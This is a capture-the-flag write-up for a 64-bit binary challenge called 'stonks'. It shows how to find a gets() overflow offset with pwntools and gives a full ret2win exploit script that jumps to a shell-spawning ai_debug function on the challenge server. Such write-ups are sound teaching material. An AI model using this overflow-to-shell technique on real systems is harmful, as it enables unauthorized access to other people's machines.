# pwn

## stonks
> Solved By : Taz and thewhiteh4t

![](https://i.imgur.com/Xthi7zA.png)

* after disassembling :

![](https://i.imgur.com/sUMBjXD.png)

* vuln function disassembled :

![](https://i.imgur.com/u5piK7j.png)

* gets is used, lets calculate the offset at which it crashes :

```python
from pwn import *

p = process("./chal")
p.sendline(cyclic(200, n=8)) # n -> architecture | 8 -> 64bit
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8), n=8)
print(offset)
```

OUTPUT :

![](https://i.imgur.com/QLOSyKX.png)

* offset is 40

* finding all functions :

```
info functions
```

![](https://i.imgur.com/0WKx65a.png)

* when we checked `ai_debug` we found that it has a system call!

![](https://i.imgur.com/ONyEGVn.png)

* then we checked what its doing :

```
b main
run
jump ai_debug
```

OUTPUT :

![](https://i.imgur.com/PIRlX9z.png)

* it is executing `/usr/bin/dash` so we can get a shell if we can call ai_debug function

* Address of ai_debug :

![](https://i.imgur.com/GNc8x6K.png)

Exploit :

```python
#!/usr/bin/python3

from pwn import *

host = 'stonks.hsc.tf'
port = 1337
offset = 40
addr = 0x401258
ret = 0x4012f3

junk = b'A' * offset
le_num = p64(addr)
le_ret = p64(ret)
buffer = junk + le_ret + le_num

conn = remote(host, port)
conn.recvuntil('symbol:')
conn.sendline(buffer)
conn.interactive()
```

* Return address has been added because there is a stack alignment issue caused by LIBC present in Ubuntu i.e. the container running on the target

* Exploit was working locally but not remotely so we found this reddit thread

* https://www.reddit.com/r/securityCTF/comments/nbb5z2/buffer_overflow_works_fine_locally_but_not/

* Thanks to [Andr3](https://github.com/AndreaCarosi-7) and hiatus!

OUTPUT :

![](https://i.imgur.com/FN6LiSU.png)